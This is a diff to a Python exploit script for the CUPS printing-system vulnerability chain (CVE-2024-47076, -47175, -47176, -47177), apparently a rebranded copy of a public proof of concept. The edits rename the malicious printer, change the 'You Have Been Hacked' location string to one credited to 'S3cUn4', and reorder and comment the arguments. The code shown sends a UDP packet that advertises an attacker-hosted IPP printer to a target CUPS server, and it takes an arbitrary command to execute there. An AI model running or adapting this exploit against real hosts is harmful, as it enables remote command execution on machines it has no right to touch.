@@ -188,8 +188,8 @@ def send_browsed_packet(ip, port, ipp_server_host, ipp_server_port, printer_name
     print(f"Sending udp packet to {ip}:{port}...")
     printer_type = 2
     printer_state = '3'
-    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/EVILCUPS'
-    printer_location = '"You Have Been Hacked!!"'
+    printer_uri = f'http://{ipp_server_host}:{ipp_server_port}/printers/SECUNACUPS'
+    printer_location = '"You Have Been Hacked By S3cUn4!!"'
     printer_info = f'"{printer_name}"'
     printer_model = '"HP LaserJet 1020"'
     packet = f"{printer_type:x} {printer_state} {printer_uri} {printer_location} {printer_info} {printer_model} \n"
@@ -267,13 +267,18 @@ def exploit_cups(target_host_ip, printer_name, transformed_ip):
 if __name__ == "__main__":
 
     parser = argparse.ArgumentParser(description="Modified exploit script from EvilSocket's PoC for series of CUPS (Common Unix Printing System) vulnerability (CVE-2024-47076, CVE-2024-47175, CVE-2024-47176, and CVE-2024-47177)")
-  
+    
+    # Define the required arguments
     parser.add_argument("-l", "--local", required=True, help="Specify the IP address to host malicious IPP server")
     parser.add_argument("-t", "--target", required=True, help="Specify the vulnerable CUPS target server's IP address")
-    parser.add_argument("-c", "--command", required=True, help="Command to execute")
     parser.add_argument("-p", "--printer", help="Specify the custom printer name to install (OPTIONAL), automatically generate random printer name if not specified")
+    parser.add_argument("-c", "--command", required=True, help="Command to execute")
+
+
+    # Parse the arguments
     args = parser.parse_args()
 
+    # Access the arguments
     ippsrv_host = args.local
     ippsrv_port = 12345
     command = args.command
